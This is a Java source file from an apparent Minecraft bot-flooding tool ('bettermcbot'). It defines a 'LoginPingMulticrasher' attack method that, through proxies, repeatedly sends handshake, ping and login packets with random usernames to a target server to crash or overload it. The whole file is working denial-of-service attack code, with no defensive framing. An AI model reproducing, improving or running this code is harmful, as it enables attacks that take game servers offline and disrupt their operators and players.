package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import ml.dima_dencep.bettermcbot.Main;
import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;
import ml.dima_dencep.bettermcbot.minecraftutils.Handshake;
import ml.dima_dencep.bettermcbot.minecraftutils.LoginRequest;
import ml.dima_dencep.bettermcbot.minecraftutils.PingPacket;

public class LoginPingMulticrasher implements Method {
   private Handshake handshake;
   private byte[] handshakebytes;
   private byte[] bytes;


   private String randomString(int len) {
      int leftLimit = 97;
      int rightLimit = 122;
      int targetStringLength = len;
      Random random = new Random();
      StringBuilder buffer = new StringBuilder(len);

      for(int i = 0; i < targetStringLength; ++i) {
         int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (float)(rightLimit - leftLimit + 1));
         buffer.append((char)randomLimitedInt);
      }

      return buffer.toString();
   }

   public LoginPingMulticrasher() {
      this.handshakebytes = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 1)).getWrappedPacket();
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      long seconds = TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis());
      if (seconds % 2L > 0L) {
         channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
         channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[]{1, 0}));
         channel.writeAndFlush(Unpooled.buffer().writeBytes((new PingPacket(System.currentTimeMillis())).getWrappedPacket()));
      } else {
         channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
         channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(this.randomString(14))).getWrappedPacket()));
      }

      ++NettyBootstrap.totalConnections;
      ++NettyBootstrap.integer;
      channel.close();
   }
}
